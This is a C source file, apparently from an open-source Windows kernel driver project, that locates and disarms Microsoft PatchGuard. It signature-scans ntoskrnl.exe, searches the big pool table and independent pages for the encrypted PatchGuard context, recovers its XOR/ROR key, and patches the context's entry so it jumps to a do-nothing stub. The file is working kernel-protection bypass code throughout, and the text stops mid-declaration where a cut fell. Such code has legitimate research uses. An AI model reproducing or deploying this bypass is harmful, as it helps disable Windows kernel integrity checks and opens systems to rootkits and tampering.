/*
*
* Copyright (c) 2015-2018 by blindtiger ( blindtiger@foxmail.com )
*
* The contents of this file are subject to the Mozilla Public License Version
* 2.0 (the "License")); you may not use this file except in compliance with
* the License. You may obtain a copy of the License at
* http://www.mozilla.org/MPL/
*
* Software distributed under the License is distributed on an "AS IS" basis,
* WITHOUT WARRANTY OF ANY KIND, either express or implied. SEe the License
* for the specific language governing rights and limitations under the
* License.
*
* The Initial Developer of the Original e is blindtiger.
*
*/

#include <OsDefs.h>

#include "Ctx.h"
#include "Except.h"
#include "Guard.h"
#include "Jump.h"
#include "Lock.h"
#include "Reload.h"
#include "Scan.h"
#include "Stack.h"
#include "Testis.h"

#define __ROL64(x, n) (((x) << ((n % 64))) | ((x) >> (64 - (n % 64))))
#define __ROR64(x, n) (((x) >> ((n % 64))) | ((x) << (64 - (n % 64))))

#define PG_KEY_INTERVAL 0x100
#define PG_FIELD_OFFSET 0x100
#define PG_FIELD_ROL_BITS 11
#define PG_MAX_FOUND 10

static PEX_SPIN_LOCK LargePoolTableLock;
static PPOOL_BIG_PAGES PoolBigPageTable;
static SIZE_T PoolBigPageTableSize;

static BOOLEAN PgIsBtcEncode;
static ULONG PgEntryRvaOffset;
static ULONG PgAppendSectionSize;
static PVOID PgAppendSection;
static ULONG PgNtSectionSize;

// context field may be 0

static ULONG64 PgContextField[4];
static WORK_QUEUE_ITEM PgClearWorkerItem;

PVOID NtosExpWorkerContext;

static ULONG_PTR PteBase;
static ULONG_PTR PdeBase;

POOL_TYPE
(NTAPI * NtosMmDeterminePoolType)(
    __in PVOID VirtualAddress
    );

VOID
(NTAPI * NtosKiStartSystemThread)(
    VOID
    );

VOID
(NTAPI * NtosPspSystemThreadStartup)(
    __in PKSTART_ROUTINE StartRoutine,
    __in PVOID StartContext
    );

VOID
(NTAPI * NtosExpWorkerThread)(
    __in PVOID StartContext
    );

PMMPTE
(NTAPI * NtosMiGetPteAddress)(
    __in PVOID VirtualAddress
    );

PMMPTE
(NTAPI * NtosMiGetPdeAddress)(
    __in PVOID VirtualAddress
    );

ULONG64
NTAPI
_btc64(
    __in ULONG64 a,
    __in ULONG64 b
);

PVOID
NTAPI
_PgEncodeClear(
    __in PVOID Reserved,
    __in PVOID PgContext
);

VOID
NTAPI
_RevertWorkerThreadToSelf(
    VOID
);

PMMPTE
NTAPI
GetPteAddress(
    __in PVOID VirtualAddress
)
{
    PMMPTE PointerPte = NULL;

    if (0 != PteBase) {
        PointerPte = (PMMPTE)
            ((((ULONG_PTR)VirtualAddress & VIRTUAL_ADDRESS_MASK) >> PTI_SHIFT) << PTE_SHIFT);

        PointerPte = (PMMPTE)(PteBase + (ULONG_PTR)PointerPte);
    }

    return PointerPte;
}

PVOID
NTAPI
GetVirtualAddressMappedByPte(
    __in PMMPTE Pte
)
{
    PVOID VirtualAddress = NULL;
    LONG_PTR Index = 0;

    Index = (LONG_PTR)Pte - PteBase;

    VirtualAddress = (PVOID)
        ((LONG_PTR)(Index << (PAGE_SHIFT + VA_SHIFT - PTE_SHIFT)) >> VA_SHIFT);

    return VirtualAddress;
}

ULONG64
NTAPI
GetKeyOffset(
    __in ULONG64 XorKey,
    __in ULONG Index
)
{
    ULONG64 ReturnKey = 0;
    ULONG LastIndex = 0;
    ULONG64 LastKey = 0;

    LastIndex = PG_KEY_INTERVAL;
    LastKey = XorKey;

    do {
        LastKey = __ROR64(
            LastKey,
            (LastIndex & 0xff));

        if (FALSE != PgIsBtcEncode) {
            LastKey = _btc64(LastKey, LastKey);
        }

        LastIndex--;

        if ((Index % PG_KEY_INTERVAL) == LastIndex) {
            ReturnKey = LastKey;
            break;
        }
    } while (0 != LastIndex);

    return ReturnKey;
}

VOID
NTAPI
SetPgContextField(
    VOID
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    HANDLE FileHandle = NULL;
    HANDLE SectionHandle = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    UNICODE_STRING ImageFileName = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    PVOID ViewBase = NULL;
    SIZE_T ViewSize = 0;
    PVOID ImageBase = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;
    ULONG Length = 0;
    PIMAGE_SECTION_HEADER NtSection = NULL;
    PRUNTIME_FUNCTION FunctionEntry = NULL;

    CHAR SectionSig[] = "2e 48 31 11 48 31 51 08 48 31 51 10 48 31 51 18";
    CHAR FieldSig[] = "fb 48 8d 05";
    CHAR FieldSigEx[] = "?? 89 ?? 00 01 00 00 48 8D 05 ?? ?? ?? ?? ?? 89 ?? 08 01 00 00";
    CHAR PgEntrySig[] = "48 81 ec c0 02 00 00 48 8d a8 d8 fd ff ff 48 83 e5 80";
    CHAR KiStartSystemThreadSig[] = "b9 01 00 00 00 44 0f 22 c1 48 8b 14 24 48 8b 4c 24 08 ff 54 24 10";
    CHAR PspSystemThreadStartupSig[] = "eb ?? b9 1e 00 00 00 e8";

    // if os build > win10 (10586) PteBase and PdeBase is random;
    CHAR MiGetPteAddressSig[] = "48 c1 e9 09 48 b8 f8 ff ff ff 7f 00 00 00 48 23 c8 48 b8 ?? ?? ?? ?? ?? ?? ?? ?? 48 03 c1 c3";

    ImageBase = GetImageHandle("ntoskrnl.exe");

    if (NULL != ImageBase) {
        RtlInitUnicodeString(
            &ImageFileName,
            L"\\SystemRoot\\System32\\ntoskrnl.exe");

        InitializeObjectAttributes(
            &ObjectAttributes,
            &ImageFileName,
            (OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE),
            NULL,
            NULL);

        Status = ZwOpenFile(
            &FileHandle,
            FILE_EXECUTE,
            &ObjectAttributes,
            &IoStatusBlock,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            0);

        if (NT_SUCCESS(Status)) {
            InitializeObjectAttributes(
                &ObjectAttributes,
                NULL,
                OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                NULL,
                NULL);

            Status = ZwCreateSection(
                &SectionHandle,
                SECTION_MAP_READ | SECTION_MAP_EXECUTE,
                &ObjectAttributes,
                NULL,
                PAGE_EXECUTE,
                SEC_IMAGE,
                FileHandle);

            if (NT_SUCCESS(Status)) {
                Status = ZwMapViewOfSection(
                    SectionHandle,
                    NtCurrentProcess(),
                    &ViewBase,
                    0L,
                    0L,
                    NULL,
                    &ViewSize,
                    ViewShare,
                    0L,
                    PAGE_EXECUTE);

                if (NT_SUCCESS(Status)) {
                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        SectionSig);

                    if (NULL != ControlPc) {
                        TargetPc = ControlPc;

                        while (0 != CmpByte(TargetPc[0], 0x41) &&
                            0 != CmpByte(TargetPc[1], 0xff) &&
                            0 != CmpByte(TargetPc[2], 0xe0)) {
                            Length = GetInstructionLength(TargetPc);

                            if (0 == PgAppendSectionSize) {
                                if (8 == Length) {
                                    if (0 == CmpByte(TargetPc[0], 0x48) &&
                                        0 == CmpByte(TargetPc[1], 0x31) &&
                                        0 == CmpByte(TargetPc[2], 0x84) &&
                                        0 == CmpByte(TargetPc[3], 0xca)) {
                                        PgAppendSectionSize = *(PULONG)(TargetPc + 4);

                                        if (0 != PgAppendSectionSize) {
                                            PgAppendSection = ExAllocatePool(
                                                NonPagedPool,
                                                PgAppendSectionSize);

                                            if (NULL != PgAppendSection) {
                                                RtlCopyMemory(
                                                    PgAppendSection,
                                                    ControlPc,
                                                    PgAppendSectionSize);
                                            }
                                        }

#ifndef VMP
                                        DbgPrint(
                                            "Soul - Testis - < %p > pg context append section size\n",
                                            PgAppendSectionSize);
#endif // !VMP
                                        if (0 == CmpByte(TargetPc[11], 0x48) ||
                                            0 == CmpByte(TargetPc[12], 0x0f) ||
                                            0 == CmpByte(TargetPc[13], 0xbb) ||
                                            0 == CmpByte(TargetPc[14], 0xc0)) {
                                            PgIsBtcEncode = TRUE;

#ifndef VMP
                                            DbgPrint("Soul - Testis - pg context btc encode enable\n");
#endif // !VMP
                                        }
                                    }
                                }
                            }

                            if (6 == Length) {
                                if (0 == CmpByte(TargetPc[0], 0x8b) &&
                                    0 == CmpByte(TargetPc[1], 0x82)) {
                                    PgEntryRvaOffset = *(PULONG)(TargetPc + 2);

#ifndef VMP
                                    DbgPrint(
                                        "Soul - Testis - < %p > pg context entry rva offset\n",
                                        PgEntryRvaOffset);
#endif // !VMP
                                    break;
                                }
                            }

                            TargetPc += Length;
                        }
                    }

                    ControlPc = ViewBase;

                    while (NULL != ControlPc) {
                        ControlPc = ScanBytes(
                            ControlPc,
                            (PCHAR)ViewBase + ViewSize,
                            FieldSig);

                        if (NULL != ControlPc) {
                            TargetPc = ScanBytes(
                                ControlPc,
                                ControlPc + PgEntryRvaOffset,
                                FieldSigEx);

                            if (NULL != TargetPc) {
                                PgContextField[0] = (ULONG64)
                                    ((TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase - 4) +
                                        *(PLONG)(TargetPc - 4) +
                                        sizeof(LONG));

                                PrintSymbol((PVOID)PgContextField[0]);

                                PgContextField[1] = (ULONG64)
                                    ((TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase + 10) +
                                        *(PLONG)(TargetPc + 10) +
                                        sizeof(LONG));

                                PrintSymbol((PVOID)PgContextField[1]);

                                PgContextField[2] = (ULONG64)
                                    ((TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase + 24) +
                                        *(PLONG)(TargetPc + 24) +
                                        sizeof(LONG));

                                PrintSymbol((PVOID)PgContextField[2]);

                                PgContextField[3] = (ULONG64)
                                    ((TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase + 38) +
                                        *(PLONG)(TargetPc + 38) +
                                        sizeof(LONG));

                                PrintSymbol((PVOID)PgContextField[3]);

                                break;
                            }

                            ControlPc++;
                        }
                        else {
                            break;
                        }
                    }

                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        PgEntrySig);

                    if (NULL != ControlPc) {
                        NtSection = SectionTableFromVirtualAddress(
                            ViewBase,
                            ControlPc);

                        if (NULL != NtSection) {
                            PgNtSectionSize = max(
                                NtSection->SizeOfRawData,
                                NtSection->Misc.VirtualSize);

#ifndef VMP
                            DbgPrint(
                                "Soul - Testis - < %p > pg context nt section size\n",
                                PgNtSectionSize);
#endif // !VMP
                        }
                    }

                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        KiStartSystemThreadSig);

                    if (NULL != ControlPc) {
                        TargetPc = ControlPc;

                        NtosKiStartSystemThread = (PVOID)
                            (TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase);

#ifndef VMP
                        DbgPrint(
                            "Soul - Testis - < %p > KiStartSystemThread\n",
                            NtosKiStartSystemThread);
#endif // !VMP
                    }

                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        PspSystemThreadStartupSig);

                    if (NULL != ControlPc) {
                        TargetPc = (PVOID)
                            (ControlPc - (ULONG64)ViewBase + (ULONG64)ImageBase);

                        FunctionEntry = DetourRtlLookupFunctionEntry(
                            (ULONG64)TargetPc,
                            (PULONG64)&ImageBase,
                            NULL);

                        if (NULL != FunctionEntry) {
                            NtosPspSystemThreadStartup = (PVOID)
                                ((PCHAR)ImageBase + FunctionEntry->BeginAddress);

#ifndef VMP
                            DbgPrint(
                                "Soul - Testis - < %p > PspSystemThreadStartup\n",
                                NtosPspSystemThreadStartup);
#endif // !VMP
                        }
                    }

                    if (OsBuildNumber >= 10586) {
                        ControlPc = ScanBytes(
                            ViewBase,
                            (PCHAR)ViewBase + ViewSize,
                            MiGetPteAddressSig);

                        if (NULL != ControlPc) {
                            TargetPc = (PVOID)
                                (ControlPc - (ULONG64)ViewBase + (ULONG64)ImageBase);

                            PteBase = *(PULONG_PTR)(TargetPc + 19);

#ifndef VMP
                            DbgPrint(
                                "Soul - Testis - < %p > PteBase\n",
                                PteBase);
#endif // !VMP
                        }
                    }
                    else {
                        PteBase = PTE_BASE;

#ifndef VMP
                        DbgPrint(
                            "Soul - Testis - < %p > PteBase\n",
                            PteBase);
#endif // !VMP
                    }

                    ZwUnmapViewOfSection(
                        NtCurrentProcess(),
                        ViewBase);
                }

                ZwClose(SectionHandle);
            }

            ZwClose(FileHandle);
        }
    }
}

PVOID
NTAPI
FindExProtectPool(
    VOID
)
{
    PVOID Result = NULL;
    PVOID ImageBase = NULL;
    PIMAGE_NT_HEADERS NtHeaders = NULL;
    PIMAGE_SECTION_HEADER NtSection = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;

    CHAR Sig[] = "48 8b ?? e8";
    CHAR SigEx[] = "ff 0f 00 00 0f 85 ?? ?? ?? ?? 48 8b ?? e8"; // check call MiDeterminePoolType

    ImageBase = GetImageHandle("ntoskrnl.exe");

    if (NULL != ImageBase) {
        NtHeaders = RtlImageNtHeader(ImageBase);

        if (NULL != NtHeaders) {
            NtSection = IMAGE_FIRST_SECTION(NtHeaders);

            ControlPc = (PCHAR)ImageBase + NtSection[0].VirtualAddress;

            while (TRUE) {
                ControlPc = ScanBytes(
                    ControlPc,
                    (PCHAR)ImageBase + NtSection[0].VirtualAddress + NtSection[0].SizeOfRawData,
                    Sig);

                if (NULL != ControlPc) {
                    TargetPc = ScanBytes(
                        ControlPc,
                        ControlPc + 0x100,
                        SigEx);

                    if (NULL != TargetPc) {
                        Result = TargetPc;

                        TargetPc = (TargetPc + 0xe) +
                            *(PLONG)(TargetPc + 0xe) + sizeof(LONG);

                        RtlCopyMemory(
                            (PVOID)&NtosMmDeterminePoolType,
                            &TargetPc,
                            sizeof(PVOID));

#ifndef VMP
                        DbgPrint(
                            "Soul - Testis - < %p > MmDeterminePoolType\n",
                            NtosMmDeterminePoolType);
#endif // !VMP
                        break;
                    }
                }
                else {
                    break;
                }

                ControlPc++;
            }
        }
    }

    return Result;
}

VOID
NTAPI
FindPoolBigPageTable(
    VOID
)
{
    PVOID ImageBase = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;
    ULONG Length = 0;
    PPOOL_BIG_PAGES * PageTable = NULL;
    PSIZE_T PageTableSize = NULL;

    ControlPc = FindExProtectPool();

    if (NULL != ControlPc) {
#ifndef VMP
        DbgPrint(
            "Soul - Testis - < %p > ExProtectPool\n",
            ControlPc);
#endif // !VMP

        TargetPc = ControlPc;

        while (TRUE) {
            Length = GetInstructionLength(TargetPc);

            if (1 == Length) {
                if (0 == CmpByte(TargetPc[0], 0xc3)) {
                    break;
                }
            }

            if (7 == Length) {
                if (0x40 == (TargetPc[0] & 0xf0)) {
                    if (0 == CmpByte(TargetPc[1], 0x8b)) {
                        if (NULL == PageTable) {
                            PageTable = (PPOOL_BIG_PAGES *)
                                ((TargetPc + 3) +
                                    *(PLONG)(TargetPc + 3) +
                                    sizeof(LONG));

                            if (0 == (ULONG64)*PageTable ||
                                0 != ((ULONG64)(*PageTable) & 0xfff)) {
                                PageTable = NULL;
                            }
                        }
                        else if (NULL == PageTableSize) {
                            PageTableSize = (PSIZE_T)
                                ((TargetPc + 3) +
                                    *(PLONG)(TargetPc + 3) +
                                    sizeof(LONG));

                            if (0 == *PageTableSize ||
                                0 != ((ULONG64)(*PageTableSize) & 0xfff)) {
                                PageTableSize = NULL;
                            }
                        }
                    }
                    else if (0 == CmpByte(TargetPc[1], 0x8d)) {
                        if (NULL == LargePoolTableLock) {
                            LargePoolTableLock = (PEX_SPIN_LOCK)
                                ((TargetPc + 3) +
                                    *(PLONG)(TargetPc + 3) +
                                    sizeof(LONG));
                        }
                    }
                }

                if (0 == CmpByte(TargetPc[0], 0x0f) &&
                    0 == CmpByte(TargetPc[1], 0x0d) &&
                    0 == CmpByte(TargetPc[2], 0x0d)) {
                    if (NULL == LargePoolTableLock) {
                        LargePoolTableLock = (PEX_SPIN_LOCK)
                            ((TargetPc + 3) +
                                *(PLONG)(TargetPc + 3) +
                                sizeof(LONG));
                    }
                }
            }

            if (NULL != PageTable &&
                NULL != PageTableSize &&
                NULL != LargePoolTableLock) {
                if ((ULONG64)*PageTable > (ULONG64)*PageTableSize) {
                    PoolBigPageTable = (PPOOL_BIG_PAGES)*PageTable;
                    PoolBigPageTableSize = (SIZE_T)*PageTableSize;
                }
                else {
                    // swap

                    PoolBigPageTable = (PPOOL_BIG_PAGES)*PageTableSize;
                    PoolBigPageTableSize = (SIZE_T)*PageTable;
                }

#ifndef VMP
                DbgPrint(
                    "Soul - Testis - < %p > PoolBigPageTable\n",
                    PoolBigPageTable);

                DbgPrint(
                    "Soul - Testis - < %p > PoolBigPageTableSize\n",
                    PoolBigPageTableSize);


                DbgPrint(
                    "Soul - Testis - < %p > LargePoolTableLock\n",
                    LargePoolTableLock);
#endif // !VMP

                break;
            }

            TargetPc +=
                GetInstructionLength(TargetPc);
        }
    }
}

PVOID
NTAPI
FindBigPoolPgEntrySig(
    __in PVOID VirtualAddress
)
{
    PVOID ControlPc = NULL;
    ULONG Index = 0;
    KIRQL Irql = 0;
    CHAR SdbpCheckDll[] =
        "48 8b 74 24 30 48 8b 7c 24 28 4c 8b 54 24 38 33 c0 49 89 02 49 83 ea 08 4c 3b d4 73 f4 48 89 7c 24 28 8b d8 8b f8 8b e8 4c 8b d0 4c 8b d8 4c 8b e0 4c 8b e8 4c 8b f0 4c 8b f8 ff e6";

    Irql = ExAcquireSpinLockShared(LargePoolTableLock);

    for (Index = 0;
        Index < PoolBigPageTableSize;
        Index++) {
        if (POOL_BIG_TABLE_ENTRY_FREE != FlagOn(
            (ULONG64)PoolBigPageTable[Index].Va,
            POOL_BIG_TABLE_ENTRY_FREE)) {
            if (NonPagedPool == NtosMmDeterminePoolType(PoolBigPageTable[Index].Va)) {
                if (PoolBigPageTable[Index].NumberOfPages > PgNtSectionSize) {
                    if ((ULONG64)VirtualAddress >= (ULONG64)PoolBigPageTable[Index].Va &&
                        (ULONG64)VirtualAddress < (ULONG64)PoolBigPageTable[Index].Va +
                        PoolBigPageTable[Index].NumberOfPages) {
                        ControlPc = ScanBytes(
                            PoolBigPageTable[Index].Va,
                            (PCHAR)PoolBigPageTable[Index].Va + PoolBigPageTable[Index].NumberOfPages,
                            SdbpCheckDll);

                        break;
                    }
                }
            }
        }
    }

    ExReleaseSpinLockShared(LargePoolTableLock, Irql);

    return ControlPc;
}

VOID
NTAPI
PgEncodeClear(
    __in PVOID Reserved,
    __in PVOID PgContext
)
{
    DbgPrint(
        "Soul - Testis - < %p > pg context clear\n",
        PgContext);
}

VOID
NTAPI
PgSetEncodeEntry(
    __in PVOID PgContext,
    __in ULONG64 RorKey
)
{
    ULONG64 LastRorKey = 0;
    ULONG EntryRva = 0;
    ULONG64 FieldBuffer[10] = { 0 };
    ULONG FieldIndex = 0;
    ULONG Index = 0;
    PCHAR ControlPc = NULL;

    // xor encode must be align 8 byte;

    // get pg entry offset in encode code

    FieldIndex = (PgEntryRvaOffset -
        PgAppendSectionSize) / sizeof(ULONG64);

    RtlCopyMemory(
        &FieldBuffer,
        (PCHAR)PgContext + (PgEntryRvaOffset & ~7),
        sizeof(FieldBuffer));

    for (Index = 0;
        Index < RTL_NUMBER_OF(FieldBuffer);
        Index++) {
        LastRorKey = GetKeyOffset(RorKey, FieldIndex + Index);
        FieldBuffer[Index] = FieldBuffer[Index] ^ LastRorKey;
    }

    EntryRva = *(PULONG)((PCHAR)&FieldBuffer + (PgEntryRvaOffset & 7));

    // copy pg entry head code to temp bufer and decode

    FieldIndex = (EntryRva - PgAppendSectionSize) / sizeof(ULONG64);

    RtlCopyMemory(
        &FieldBuffer,
        (PCHAR)PgContext + (EntryRva & ~7),
        sizeof(FieldBuffer));

    for (Index = 0;
        Index < RTL_NUMBER_OF(FieldBuffer);
        Index++) {
        LastRorKey = GetKeyOffset(RorKey, FieldIndex + Index);
        FieldBuffer[Index] = FieldBuffer[Index] ^ LastRorKey;
    }

    // set temp buffer pg entry head jmp to _PgEncodeClear an encode

    ControlPc = (PCHAR)&FieldBuffer + (EntryRva & 7);

    BuildJumpCode(
        _PgEncodeClear,
        &ControlPc);

    for (Index = 0;
        Index < RTL_NUMBER_OF(FieldBuffer);
        Index++) {
        LastRorKey = GetKeyOffset(RorKey, FieldIndex + Index);
        FieldBuffer[Index] = FieldBuffer[Index] ^ LastRorKey;
    }

    // copy temp buffer pg entry head to old address, 
    // when PatchGuard code decode self jmp _PgEncodeClear.

    RtlCopyMemory(
        (PCHAR)PgContext + (EntryRva & ~7),
        &FieldBuffer,
        sizeof(FieldBuffer));

    DbgPrint("Soul - Testis - pg context disarmed\n");
}

VOID
NTAPI
PgClearEncodeContext(
    __in PVOID VirtualAddress,
    __in SIZE_T RegionSize
)
{
    PCHAR TargetPc = NULL;
    SIZE_T Index = 0;
    ULONG64 RorKey = 0;
    PULONG64 Field = NULL;
    PVOID PgContext = NULL;

    TargetPc = VirtualAddress;

    while ((ULONG64)TargetPc <
        (ULONG64)VirtualAddress + RegionSize - PgAppendSectionSize) {
        Field = TargetPc;

        if ((ULONG64)Field == (ULONG64)&PgContextField) {
            break;
        }

        RorKey = Field[3] ^ PgContextField[3];

        // loc_140D6DECD : ; CODE XREF : CmpAppendDllSection + 98¡ýj
        // xor [rdx + rcx * 8 + 0C0h], rax
        // ror rax, cl

        // if >= win10 17134 btc rax, rax here

        // loop loc_140D6DECD

        if (0 == RorKey) {
            if (Field[2] == PgContextField[2] &&
                Field[1] == PgContextField[1] &&
                Field[0] == PgContextField[0]) {
                PgContext = TargetPc - PG_FIELD_OFFSET;

#ifndef VMP
                DbgPrint(
                    "Soul - Testis - found decode pg context at < %p >\n",
                    PgContext);
#endif // !VMP
                break;
            }
        }
        else {
            RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS);

            if (FALSE != PgIsBtcEncode) {
                RorKey = _btc64(RorKey, RorKey);
            }

            if ((ULONG64)(Field[2] ^ RorKey) == (ULONG64)PgContextField[2]) {
                RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 1);

                if (FALSE != PgIsBtcEncode) {
                    RorKey = _btc64(RorKey, RorKey);
                }

                if ((ULONG64)(Field[1] ^ RorKey) == (ULONG64)PgContextField[1]) {
                    RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 2);

                    if (FALSE != PgIsBtcEncode) {
                        RorKey = _btc64(RorKey, RorKey);
                    }

                    if ((ULONG64)(Field[0] ^ RorKey) == (ULONG64)PgContextField[0]) {
                        PgContext = TargetPc - PG_FIELD_OFFSET;

                        RorKey = __ROR64(Field[0] ^ PgContextField[0], PG_FIELD_ROL_BITS - 3);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 4);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 5);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 6);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 7);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 8);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 9);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS - 10);

                        if (FALSE != PgIsBtcEncode) {
                            RorKey = _btc64(RorKey, RorKey);
                        }

                        DbgPrint(
                            "Soul - Testis - found encode pg context at < %p > RorKey < %p >\n",
                            PgContext,
                            RorKey);

                        PgSetEncodeEntry(PgContext, RorKey);

                        break;
                    }
                }
            }
        }

        TargetPc++;
    }
}

PRTL_BITMAP
NTAPI
FindSystemPageBitmap(
    VOID
)
{
    PRTL_BITMAP Bitmap = NULL;
    PVOID ImageBase = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;
    ULONG Length = 0;

    ImageBase = GetImageHandle("ntoskrnl.exe");

    if (NULL != ImageBase) {
        ControlPc = GetProcedureAddress(
            ImageBase,
            "MmAllocateMappingAddress",
            0);

        if (NULL != ControlPc) {
            while (TRUE) {
                Length = GetInstructionLength(ControlPc);

                if (1 == Length) {
                    if (0 == CmpByte(ControlPc[0], 0xc3)) {
                        break;
                    }
                }

                if (7 == Length) {
                    if (0 == CmpByte(ControlPc[0], 0x48) &&
                        0 == CmpByte(ControlPc[1], 0x8d) &&
                        0 == CmpByte(ControlPc[2], 0x0d)) {
                        TargetPc = RVA_TO_VA(ControlPc + 3);

                        if (FALSE != MmIsAddressValid(TargetPc)) {
                            // MiKernelStackPteInfo->Header
                            Bitmap = TargetPc;
                        }

                        break;
                    }
                }

                ControlPc += Length;
            }
        }
    }

    return Bitmap;
}

BOOLEAN
NTAPI
IsIndependentPages(
    __in PVOID VirtualAddress
)
{
    BOOLEAN Result = FALSE;
    PRTL_BITMAP Bitmap = NULL;

    Bitmap = FindSystemPageBitmap();

    if (NULL != Bitmap) {
        if ((ULONG_PTR)VirtualAddress >= (ULONG_PTR)Bitmap->Buffer &&
            (ULONG_PTR)VirtualAddress <
            (ULONG_PTR)Bitmap->Buffer + PAGE_SIZE * Bitmap->SizeOfBitMap * 8) {
            Result = TRUE;
        }
    }

    return Result;
}

VOID
NTAPI
PgClearPagesContext(
    VOID
)
{
    PRTL_BITMAP Bitmap = NULL;
    PMMPTE PointerPte = NULL;
    PVOID VirtualAddress = NULL;
    SIZE_T Index = 0;

    /*
    PatchGuard pages allocate by MmAllocateIndependentPages

    PTEs fields like this

    nt!_MMPTE
    [+0x000] Long             : 0x2da963 [Type: unsigned __int64]
    [+0x000] VolatileLong     : 0x2da963 [Type: unsigned __int64]
    [+0x000] Hard             [Type: _MMPTE_HARDWARE]

        [+0x000 ( 0: 0)] Valid            : 0x1 [Type: unsigned __int64] <- valid
        [+0x000 ( 1: 1)] Dirty1           : 0x1 [Type: unsigned __int64] <-
        [+0x000 ( 2: 2)] Owner            : 0x0 [Type: unsigned __int64]
        [+0x000 ( 3: 3)] WriteThrough     : 0x0 [Type: unsigned __int64]
        [+0x000 ( 4: 4)] CacheDisable     : 0x0 [Type: unsigned __int64]
        [+0x000 ( 5: 5)] Accessed         : 0x1 [Type: unsigned __int64] <-
        [+0x000 ( 6: 6)] Dirty            : 0x1 [Type: unsigned __int64] <-
        [+0x000 ( 7: 7)] LargePage        : 0x0 [Type: unsigned __int64]
        [+0x000 ( 8: 8)] Global           : 0x1 [Type: unsigned __int64] <- kernel pte
        [+0x000 ( 9: 9)] CopyOnWrite      : 0x0 [Type: unsigned __int64]
        [+0x000 (10:10)] Unused           : 0x0 [Type: unsigned __int64]
        [+0x000 (11:11)] Write            : 0x1 [Type: unsigned __int64] <- page writable
        [+0x000 (47:12)] PageFrameNumber  : 0x2da [Type: unsigned __int64] <- pfn index
        [+0x000 (51:48)] reserved1        : 0x0 [Type: unsigned __int64]
        [+0x000 (62:52)] SoftwareWsIndex  : 0x0 [Type: unsigned __int64]
        [+0x000 (63:63)] NoExecute        : 0x0 [Type: unsigned __int64] <- page executable

    [+0x000] Flush            [Type: _HARDWARE_PTE]
    [+0x000] Proto            [Type: _MMPTE_PROTOTYPE]
    [+0x000] Soft             [Type: _MMPTE_SOFTWARE]
    [+0x000] TimeStamp        [Type: _MMPTE_TIMESTAMP]
    [+0x000] Trans            [Type: _MMPTE_TRANSITION]
    [+0x000] Subsect          [Type: _MMPTE_SUBSECTION]
    [+0x000] List             [Type: _MMPTE_LIST]
    */

#define VALID_PTE 0x0000000000000963UI64
#define VALID_PTE_EX 0xFFFF00000000069CUI64

    Bitmap = FindSystemPageBitmap();

    if (NULL != Bitmap) {
        for (Index = 0;
            Index < Bitmap->SizeOfBitMap;
            Index++) {
            VirtualAddress = (PCHAR)Bitmap->Buffer + PAGE_SIZE * Index;

            if (FALSE != MmIsAddressValid(VirtualAddress)) {
                PointerPte = GetPteAddress(VirtualAddress);

                if (VALID_PTE == (PointerPte->u.Long & VALID_PTE) &&
                    0 == (PointerPte->u.Long & VALID_PTE_EX)) {
                    // here must be lock with mdl,
                    // I'm in noimage.

                    PgClearEncodeContext(VirtualAddress, PAGE_SIZE);
                }
            }
        }
    }
}

VOID
NTAPI
PgClearBigPoolContext(
    VOID
)
{
    PCHAR TargetPc = NULL;
    SIZE_T Index = 0;
    ULONG64 RorKey = 0;
    PULONG64 Field = NULL;
    PVOID PgContext = NULL;
    KIRQL Irql = 0;

    Irql = ExAcquireSpinLockShared(LargePoolTableLock);

    for (Index = 0;
        Index < PoolBigPageTableSize;
        Index++) {
        if (POOL_BIG_TABLE_ENTRY_FREE != FlagOn(
            (ULONG64)PoolBigPageTable[Index].Va,
            POOL_BIG_TABLE_ENTRY_FREE)) {
            if (NonPagedPool == NtosMmDeterminePoolType(PoolBigPageTable[Index].Va)) {
                if (PoolBigPageTable[Index].NumberOfPages > PgNtSectionSize) {
                    PgClearEncodeContext(
                        PoolBigPageTable[Index].Va,
                        PoolBigPageTable[Index].NumberOfPages);
                }
            }
        }
    }

    ExReleaseSpinLockShared(LargePoolTableLock, Irql);
}

VOID
NTAPI
PgDecodeClear(
    VOID
)
{
    DbgPrint("Soul - Testis - pg worker clear\n");
}

VOID
NTAPI
